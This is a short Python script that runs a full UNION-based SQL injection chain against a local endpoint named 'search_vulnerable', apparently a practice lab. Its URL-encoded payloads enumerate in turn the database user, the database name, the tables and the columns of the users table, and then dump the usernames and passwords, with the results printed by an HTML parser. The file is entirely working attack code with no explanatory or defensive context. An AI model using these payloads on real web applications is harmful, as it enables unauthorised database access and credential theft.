import requests as r
from bs4 import BeautifulSoup
from pwn import *

def parse_html(html):
	soup = BeautifulSoup(html, 'html.parser')

	# Find all <h2> tags that have the class "card-title"
	h2_tags = soup.find_all('h2', class_='card-title', limit=10)
	p_tags = soup.find_all('p', class_='card-text', limit=10)

	for h2_tag in h2_tags:
		title_text = h2_tag.text
		if title_text != "None":
			print(f"{title_text}")

	for p_tag in p_tags:
		p_text = p_tag.text
		if p_text != "None":
			print(f"{p_text}")

	return

if __name__ == '__main__':
	progress_bar = log.progress("FULL-CHAIN SQLi Exploit")

	url = "http://127.0.0.1:5000/search_vulnerable?q=a%27%20UNION%20SELECT%20NULL,%20user(),%20NULL,%20NULL,%20NULL%20%23"
	response = r.get(url=url)
	print("===== CURRENT DB USERNAME =====")
	parse_html(response.text)
	print("\n")

	url = "http://127.0.0.1:5000/search_vulnerable?q=a%27%20UNION%20SELECT%20NULL,%20database(),%20NULL,%20NULL,%20NULL%20%23"
	response = r.get(url=url)
	print("===== CURRENT DATABASE =====")
	parse_html(response.text)
	print("\n")

	url = "http://127.0.0.1:5000/search_vulnerable?q=a%27%20UNION%20SELECT%20NULL,%20table_name,%20NULL,%20NULL,%20NULL%20from%20information_schema.tables%20%23"
	response = r.get(url=url)
	print("===== TABLES WITHIN CURRENT DATABASE =====")
	parse_html(response.text)
	print("\n")

	url = "http://127.0.0.1:5000/search_vulnerable?q=a%27%20UNION%20SELECT%20NULL,%20column_name,%20NULL,%20NULL,%20NULL%20from%20information_schema.columns%20where%20table_name%20=%20%22users%22%20%23"
	response = r.get(url=url)
	print("===== COLUMNS FROM USERS TABLE =====")
	parse_html(response.text)
	print("\n")

	url = "http://127.0.0.1:5000/search_vulnerable?q=a%27%20UNION%20SELECT%20NULL,%20username,%20password,%20NULL,%20NULL%20from%20users%20%23"
	response = r.get(url=url)
	print("===== USERS TABLE CONTENTS =====")
	parse_html(response.text)
	print("\n")

	progress_bar.success()

